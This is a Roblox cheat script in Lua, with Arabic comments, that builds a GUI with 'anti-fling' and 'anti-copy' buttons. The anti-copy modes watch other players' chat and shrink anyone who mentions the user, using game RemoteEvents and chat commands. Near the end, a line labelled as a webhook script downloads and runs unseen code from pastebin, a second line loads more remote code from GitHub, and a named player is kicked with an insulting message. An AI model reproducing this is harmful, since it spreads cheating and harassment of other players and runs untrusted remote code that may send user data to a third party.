antiTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
antiTitle.BackgroundTransparency = 1
antiTitle.Font = Enum.Font.SourceSansBold
antiTitle.TextSize = 20
antiTitle.Parent = antiPage



-- إنشاء زر إصلاح الموقع داخل صفحة المضادات
local teleportButton = Instance.new("TextButton")
teleportButton.Size = UDim2.new(0.8, 0, 0.13, 0)   
teleportButton.Position = UDim2.new(0.1, 0, 0.15, 0) 
teleportButton.Text = "مضاد بانج"
teleportButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
teleportButton.TextColor3 = Color3.new(0, 0, 0)
teleportButton.Font = Enum.Font.SourceSansBold
teleportButton.TextSize = 14
teleportButton.Parent = antiPage

-- زوايا مستديرة للزر
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0.2, 0)
buttonCorner.Parent = teleportButton

-- تأثير التدرج اللوني
local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 0))
}
buttonGradient.Rotation = 90
buttonGradient.Parent = teleportButton

-- وظيفة زر إصلاح الموقع
teleportButton.MouseButton1Click:Connect(function()
    local originalText = teleportButton.Text
    
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    local originalHeight = game.Workspace.FallenPartsDestroyHeight
    game.Workspace.FallenPartsDestroyHeight = -10000
    
    local originalPos = humanoidRootPart.Position
    humanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -8000, 0))
    task.wait(0.1)
    humanoidRootPart.CFrame = CFrame.new(originalPos)
    
    game.Workspace.FallenPartsDestroyHeight = originalHeight
    task.wait(0.1)
    teleportButton.Text = originalText
end)

-- إنشاء زر مضاد النسخ (بنفس تدرج لون مضاد بانج)
local antiCopyButton = Instance.new("TextButton")
antiCopyButton.Size = UDim2.new(0.8, 0, 0.13, 0)
antiCopyButton.Position = UDim2.new(0.1, 0, 0.3, 0)
antiCopyButton.Text = "مضاد نسخ"
antiCopyButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
antiCopyButton.TextColor3 = Color3.new(0, 0, 0)
antiCopyButton.Font = Enum.Font.SourceSansBold
antiCopyButton.TextSize = 14
antiCopyButton.Parent = antiPage

-- زوايا مستديرة للزر
local antiCopyCorner = Instance.new("UICorner")
antiCopyCorner.CornerRadius = UDim.new(0.2, 0)
antiCopyCorner.Parent = antiCopyButton

-- تأثير التدرج اللوني لمضاد النسخ
local antiCopyGradient = Instance.new("UIGradient")
antiCopyGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 0))
}
antiCopyGradient.Rotation = 90
antiCopyGradient.Parent = antiCopyButton

-- إنشاء زر المضاد المتقدم (بنفس التدرج اللوني)
local antiAdvancedButton = Instance.new("TextButton")
antiAdvancedButton.Size = UDim2.new(0.8, 0, 0.13, 0)
antiAdvancedButton.Position = UDim2.new(0.1, 0, 0.45, 0)
antiAdvancedButton.Text = "مضاد نسخ ب 100%"
antiAdvancedButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
antiAdvancedButton.TextColor3 = Color3.new(0, 0, 0)
antiAdvancedButton.Font = Enum.Font.SourceSansBold
antiAdvancedButton.TextSize = 14
antiAdvancedButton.Parent = antiPage

-- زوايا مستديرة للزر
local antiAdvancedCorner = Instance.new("UICorner")
antiAdvancedCorner.CornerRadius = UDim.new(0.2, 0)
antiAdvancedCorner.Parent = antiAdvancedButton

-- تأثير التدرج اللوني للمضاد المتقدم
local antiAdvancedGradient = Instance.new("UIGradient")
antiAdvancedGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 0))
}
antiAdvancedGradient.Rotation = 90
antiAdvancedGradient.Parent = antiAdvancedButton

-- إضافة ملاحظة
local ns = Instance.new("TextLabel")
ns.Size = UDim2.new(0, 310, -0.35, 10)
ns.Position = UDim2.new(0.5, -150, 0.77, 0)
ns.Text = "ملاحظه: لا تفعل زر مضاد بنسبه 100 الى اذا كان لاعب ينسخ عليك"
ns.TextColor3 = Color3.new(1, 0, 0)
ns.BackgroundTransparency = 1
ns.Font = Enum.Font.SourceSans
ns.TextSize = 15
ns.Parent = antiPage

-- متغيرات التحكم لمضاد النسخ
local antiCopyEnabled = false
local chatCopyConnections = {}
local playerAddedCopyConnection = nil

-- متغيرات التحكم للمضاد المتقدم
local antiAdvancedEnabled = false
local chatAdvancedConnections = {}
local playerAddedAdvancedConnection = nil

-- وظائف مضاد النسخ (تبقى كما هي)
local function disableAntiCopy()
    for _, connection in pairs(chatCopyConnections) do
        connection:Disconnect()
    end
    chatCopyConnections = {}
    
    if playerAddedCopyConnection then
        playerAddedCopyConnection:Disconnect()
        playerAddedCopyConnection = nil
    end
    
    antiCopyButton.Text = "مضاد نسخ"
    antiCopyButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
end

local function enableAntiCopy()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local playerName = player.Name
    local lowerPlayerName = playerName:lower()
    local lastCommandTime = 0
    local cooldown = 1

    local function containsMyName(message)
        local lowerMessage = message:lower()
        if lowerMessage:find(lowerPlayerName, 1, true) then
            return true
        end
        
        for i = 2, #playerName do
            if lowerMessage:find(playerName:sub(1, i):lower(), 1, true) then
                return true
            end
        end
        return false
    end

    local function punishPlayer(targetName)
        local currentTime = tick()
        if currentTime - lastCommandTime < cooldown then return end
        
        pcall(function()
            game:GetService("ReplicatedStorage").PrivateCommands.Char:FireServer(4592243049)
            game:GetService("ReplicatedStorage").PrivateCommands.Char:FireServer("No")
        end)
        
        local command = "/e .size "..targetName.." 0"
        local success = pcall(function()
            game:GetService('Players'):Chat(command)
        end)
        
        if success then
            lastCommandTime = currentTime
        end
    end

    local function onPlayerChatted(plr, msg)
        if plr == player then return end
        if containsMyName(msg) then
            punishPlayer(plr.Name)
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            chatCopyConnections[plr] = plr.Chatted:Connect(function(msg)
                onPlayerChatted(plr, msg)
            end)
        end
    end

    playerAddedCopyConnection = Players.PlayerAdded:Connect(function(plr)
        chatCopyConnections[plr] = plr.Chatted:Connect(function(msg)
            onPlayerChatted(plr, msg)
        end)
    end)

    antiCopyButton.Text = "إيقاف مضاد النسخ"
    antiCopyButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
end

-- وظائف المضاد المتقدم (الجديد)
local function disableAntiAdvanced()
    for _, connection in pairs(chatAdvancedConnections) do
        connection:Disconnect()
    end
    chatAdvancedConnections = {}
    
    if playerAddedAdvancedConnection then
        playerAddedAdvancedConnection:Disconnect()
        playerAddedAdvancedConnection = nil
    end
    
    antiAdvancedButton.Text = "مضاد نسخ ب100%"
    antiAdvancedButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
end

local function enableAntiAdvanced()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local playerName = player.Name
    local lowerPlayerName = playerName:lower()
    local lastCommandTime = 0
    local cooldown = 1

    -- دالة الكشف عن التشفير
    local function isEncrypted(message)
        return message:find("#") ~= nil
    end

    -- دالة الكشف عن الاسم
    local function containsMyName(message)
        local lowerMessage = message:lower()
        if lowerMessage:find(lowerPlayerName, 1, true) then
            return true
        end
        
        for i = 2, #playerName do
            if lowerMessage:find(playerName:sub(1, i):lower(), 1, true) then
                return true
            end
        end
        return false
    end

    local function punishPlayer(targetName)
        local currentTime = tick()
        if currentTime - lastCommandTime < cooldown then return end
        
        pcall(function()
            game:GetService("ReplicatedStorage").PrivateCommands.Char:FireServer(4592243049)
            game:GetService("ReplicatedStorage").PrivateCommands.Char:FireServer("No")
        end)
        
        local command = "/e .size "..targetName.." 0"
        local success = pcall(function()
            game:GetService('Players'):Chat(command)
        end)
        
        if success then
            lastCommandTime = currentTime
        end
    end

    local function onPlayerChatted(plr, msg)
        if plr == player then return end
        if isEncrypted(msg) or containsMyName(msg) then
            punishPlayer(plr.Name)
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            chatAdvancedConnections[plr] = plr.Chatted:Connect(function(msg)
                onPlayerChatted(plr, msg)
            end)
        end
    end

    playerAddedAdvancedConnection = Players.PlayerAdded:Connect(function(plr)
        chatAdvancedConnections[plr] = plr.Chatted:Connect(function(msg)
            onPlayerChatted(plr, msg)
        end)
    end)

    antiAdvancedButton.Text = "إيقاف المضاد نسخ 100%"
    antiAdvancedButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
end

-- وظائف التبديل
local function toggleAntiCopy()
    antiCopyEnabled = not antiCopyEnabled
    if antiCopyEnabled then
        enableAntiCopy()
    else
        disableAntiCopy()
    end
end

local function toggleAntiAdvanced()
    antiAdvancedEnabled = not antiAdvancedEnabled
    if antiAdvancedEnabled then
        enableAntiAdvanced()
    else
        disableAntiAdvanced()
    end
end

-- ربط الأزرار
antiCopyButton.MouseButton1Click:Connect(toggleAntiCopy)
antiAdvancedButton.MouseButton1Click:Connect(toggleAntiAdvanced)

-- إضافة الصفحة إلى جدول الصفحات
pages["مضادات"] = antiPage


-- وظيفة إظهار/إخفاء الصفحات
local function showPage(pageName)
    for name, page in pairs(pages) do
        page.Visible = (name == pageName)
    end
end

-- إنشاء الأزرار
for _, buttonData in pairs(buttons) do
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 80, 0, 25)
    button.Position = buttonData.Position
    button.Text = buttonData.Text
    button.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 12
    button.Parent = leftFrame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0.2, 0)
    buttonCorner.Parent = button

    button.MouseButton1Click:Connect(function()
        showPage(buttonData.Text)
    end)
end

-- إغلاق الواجهة
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- وظيفة تحريك الواجهة
local dragging
local dragInput
local dragStart
local startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

topBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateInput(input)
    end
end)
--سكربت الويب هوك 
loadstring(game:HttpGet("https://pastebin.com/raw/giFdUDnw"))()










--سكربت الوامر 
loadstring(game:HttpGet("https://raw.githubusercontent.com/fscript4u/scriptcmdsfor1st/refs/heads/main/%D9%83%D9%88%D9%85%D8%A7%D9%86%D8%AF"))()







-- اسم اللاعب اللي تبي تطرده تلقائيًا
local blockedUser = "Rashid91100"

-- طرد اللاعب إذا كان موجود قبل تشغيل السكربت
for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player.Name:lower() == blockedUser:lower() then
        player:Kick("انت غير مرحب بك بل سكربت ايها السارق ههههههههههههههههههههههههه")
    end
end

